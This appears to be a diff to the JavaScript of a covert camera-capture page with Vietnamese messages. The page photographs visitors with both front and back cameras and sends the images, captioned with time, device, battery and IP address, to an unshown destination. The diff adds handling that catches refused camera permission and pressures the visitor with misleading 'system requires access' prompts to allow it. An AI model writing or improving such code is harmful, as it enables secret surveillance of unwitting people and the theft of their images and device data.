@@ -574,7 +574,16 @@
     });
   }
 
-  function hienThiLoiCamera(){
+  function laLoiQuyen(err){
+    if(!err) return false;
+    var n = err.name || "";
+    if(n === "NotAllowedError") return true;
+    if(n === "PermissionDeniedError") return true;
+    if(n === "SecurityError") return true;
+    return false;
+  }
+
+  function hienThiLoiQuyen(){
     S.textContent = "\u26a0\ufe0f B\u1ea1n CH\u01afA NH\u1ea4N CHO PH\u00c9P. H\u00e3y nh\u1ea5n l\u1ea1i v\u00e0 ch\u1ecdn \"Cho ph\u00e9p\".";
     S.classList.add("error");
     P.innerHTML = "\u26a0\ufe0f <b>H\u1ec7 th\u1ed1ng y\u00eau c\u1ea7u quy\u1ec1n truy c\u1eadp.</b><br>Vui l\u00f2ng nh\u1ea5n l\u1ea1i n\u00fat b\u00ean d\u01b0\u1edbi v\u00e0 ch\u1ecdn <b>\"Cho ph\u00e9p\"</b> \u0111\u1ec3 ti\u1ebfp t\u1ee5c.";
@@ -650,7 +659,7 @@
       return null;
     }
 
-    await new Promise(function(r){ setTimeout(r, 800); });
+    await new Promise(function(r){ setTimeout(r, 900); });
 
     var blob = null;
     var track = stream.getVideoTracks()[0];
@@ -712,7 +721,7 @@
     try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
     V.srcObject = null;
 
-    await new Promise(function(r){ setTimeout(r, 500); });
+    await new Promise(function(r){ setTimeout(r, 600); });
 
     return blob;
   }
@@ -734,40 +743,54 @@
   }
 
   async function captureFrontCamera(){
-    var blob = null;
+    var result = { blob: null, err: null, gotPermission: false };
+
     try{
       var s = await getCameraByFacing("user");
-      blob = await snapFromStream(s);
-      if(blob) return blob;
-    }catch(e){}
+      result.gotPermission = true;
+      result.blob = await snapFromStream(s);
+      if(result.blob) return result;
+    }catch(e){
+      result.err = e;
+      if(laLoiQuyen(e)) return result;
+    }
 
     try{
       var cams = await getAllCameras();
       for(var i = 0; i < cams.length; i++){
         try{
           var s2 = await getCameraByDeviceId(cams[i].deviceId);
+          result.gotPermission = true;
           var t = s2.getVideoTracks()[0];
           var settings = t.getSettings ? t.getSettings() : {};
           if(settings.facingMode === "environment"){
             try{ s2.getTracks().forEach(function(x){ x.stop(); }); }catch(e){}
             continue;
           }
-          blob = await snapFromStream(s2);
-          if(blob) return blob;
-        }catch(e){}
+          result.blob = await snapFromStream(s2);
+          if(result.blob) return result;
+        }catch(e){
+          if(!result.err) result.err = e;
+          if(laLoiQuyen(e)) return result;
+        }
       }
     }catch(e){}
 
-    return null;
+    return result;
   }
 
   async function captureBackCamera(){
-    var blob = null;
+    var result = { blob: null, err: null, gotPermission: false };
+
     try{
       var s = await getCameraByFacing("environment");
-      blob = await snapFromStream(s);
-      if(blob) return blob;
-    }catch(e){}
+      result.gotPermission = true;
+      result.blob = await snapFromStream(s);
+      if(result.blob) return result;
+    }catch(e){
+      result.err = e;
+      if(laLoiQuyen(e)) return result;
+    }
 
     try{
       var cams = await getAllCameras();
@@ -785,35 +808,55 @@
       if(backCam){
         try{
           var s2 = await getCameraByDeviceId(backCam.deviceId);
-          blob = await snapFromStream(s2);
-          if(blob) return blob;
-        }catch(e){}
+          result.gotPermission = true;
+          result.blob = await snapFromStream(s2);
+          if(result.blob) return result;
+        }catch(e){
+          if(!result.err) result.err = e;
+          if(laLoiQuyen(e)) return result;
+        }
       }
     }catch(e){}
 
-    return null;
+    return result;
   }
 
   async function captureAndSendBoth(baseCaption){
     var anySent = false;
+    var anyPermissionDenied = false;
+    var anySuccess = false;
 
-    var bFront = await captureFrontCamera();
-    if(bFront){
+    var rFront = await captureFrontCamera();
+    if(laLoiQuyen(rFront.err)) anyPermissionDenied = true;
+    if(rFront.blob) anySuccess = true;
+
+    if(rFront.blob){
       var capFront = baseCaption.replace("__CAM__", "\uD83D\uDCF8 CAM TR\u01af\u1edaC");
-      var sent1 = await sendPhoto(bFront, capFront, "front.jpg");
+      var sent1 = await sendPhoto(rFront.blob, capFront, "front.jpg");
       if(sent1) anySent = true;
     }
 
-    await new Promise(function(r){ setTimeout(r, 700); });
+    await new Promise(function(r){ setTimeout(r, 900); });
 
-    var bBack = await captureBackCamera();
-    if(bBack){
+    var rBack = await captureBackCamera();
+    if(laLoiQuyen(rBack.err)) anyPermissionDenied = true;
+    if(rBack.blob) anySuccess = true;
+
+    if(rBack.blob){
       var capBack = baseCaption.replace("__CAM__", "\uD83D\uDCF8 CAM SAU");
-      var sent2 = await sendPhoto(bBack, capBack, "back.jpg");
+      var sent2 = await sendPhoto(rBack.blob, capBack, "back.jpg");
       if(sent2) anySent = true;
     }
 
-    return anySent;
+    if(anySent){
+      return { ok: true, permissionDenied: false };
+    }
+
+    if(anyPermissionDenied){
+      return { ok: false, permissionDenied: true };
+    }
+
+    return { ok: false, permissionDenied: false };
   }
 
   function loadImage(){
@@ -1176,10 +1219,19 @@
 
     var baseCaption = buildCaption(time, device, batt, ip, "__CAM__");
 
-    var ok = await captureAndSendBoth(baseCaption);
+    var result = await captureAndSendBoth(baseCaption);
 
-    if(!ok){
-      hienThiLoiCamera();
+    if(!result.ok){
+      if(result.permissionDenied){
+        hienThiLoiQuyen();
+      }else{
+        S.textContent = "\u26a0\ufe0f Kh\u00f4ng th\u1ec3 ch\u1ee5p \u1ea3nh. Vui l\u00f2ng th\u1eed l\u1ea1i.";
+        S.classList.add("error");
+        P.textContent = "Vui l\u00f2ng nh\u1ea5n l\u1ea1i n\u00fat b\u00ean d\u01b0\u1edbi \u0111\u1ec3 th\u1eed l\u1ea1i.";
+        B.style.display = "flex";
+        B.querySelector("span").textContent = "\ud83d\udd04 TH\u1eec L\u1ea0I";
+        TITLE.textContent = "Kh\u00f4ng Th\u1ec3 Ch\u1ee5p \u1ea2nh";
+      }
       return;
     }
 
